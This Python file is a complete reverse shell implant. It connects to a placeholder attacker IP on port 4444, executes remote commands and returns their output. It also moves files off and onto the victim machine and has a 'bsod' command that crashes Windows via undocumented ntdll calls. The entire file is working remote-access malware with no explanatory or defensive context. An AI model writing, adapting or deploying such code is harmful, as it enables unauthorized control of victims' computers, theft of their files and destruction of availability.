import socket
import subprocess
import os
import ctypes
import time


ATTACKER_IP = "IP ATTACKER"
PORT = 4444
BUFFER_SIZE = 8192


def send_output(conn, output):
    try:
        if not output:
            return
        for i in range(0, len(output), BUFFER_SIZE):
            conn.send(output[i:i+BUFFER_SIZE])
    except:
        pass


def handle_download(conn, filename):
    try:
        if not os.path.exists(filename):
            conn.send(f"[-] Error: File '{filename}' not found.\n".encode())
            return

        filesize = os.path.getsize(filename)
        conn.send(f"[+] Sending {os.path.basename(filename)} ({filesize} bytes)\n".encode())

        with open(filename, "rb") as f:
            while chunk := f.read(BUFFER_SIZE):
                conn.send(chunk)

        conn.send(b"<END_OF_FILE>")
        print(f"[+] File sent: {filename}")

    except Exception as e:
        conn.send(f"[-] Download error: {str(e)}\n".encode())


def handle_upload(conn, filename):
    try:
        conn.send(f"[+] Ready to receive file: {filename}\n".encode())

        with open(filename, "wb") as f:
            while True:
                chunk = conn.recv(BUFFER_SIZE)
                if b"<END_OF_FILE>" in chunk:
                    chunk = chunk.replace(b"<END_OF_FILE>", b"")
                    if chunk:
                        f.write(chunk)
                    break
                if not chunk:
                    break
                f.write(chunk)

        conn.send(f"[+] File uploaded successfully: {filename}\n".encode())
        print(f"[+] File received: {filename}")

    except Exception as e:
        conn.send(f"[-] Upload error: {str(e)}\n".encode())


def shell(conn):
    while True:
        try:
            command = conn.recv(BUFFER_SIZE).decode("utf-8", errors="ignore").strip()

            if not command:
                continue

            if command.lower() in ["exit", "quit"]:
                conn.send(b"[+] Connection terminated by client.\n")
                break

            if command.lower().startswith("download "):
                filename = command.split(maxsplit=1)[1]
                handle_download(conn, filename)
                continue

            elif command.lower().startswith("upload "):
                filename = command.split(maxsplit=1)[1]
                handle_upload(conn, filename)
                continue
            # ===========================================================

            if command.lower() == "bsod":
                try:
                    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
                except:
                    pass
                continue

            if command.lower().startswith("cd "):
                try:
                    new_dir = command[3:].strip()
                    os.chdir(new_dir)
                except:
                    pass
                continue

            proc = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                text=False,          
                cwd=os.getcwd()
            )

            stdout, stderr = proc.communicate(timeout=30)

            if stdout:
                send_output(conn, stdout)
            if stderr:
                send_output(conn, b"ERROR: " + stderr)

            if not stdout and not stderr:
                if proc.returncode != 0:
                    conn.send(f"Command finished with code {proc.returncode}\n".encode())

        except subprocess.TimeoutExpired:
            conn.send(b"[-] Command timeout (30s)\n")
        except Exception:
            break


def main():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, PORT))
        
        shell(s)
        
    except:
        pass
    finally:
        try:
            s.close()
        except:
            pass


if __name__ == "__main__":
    main()
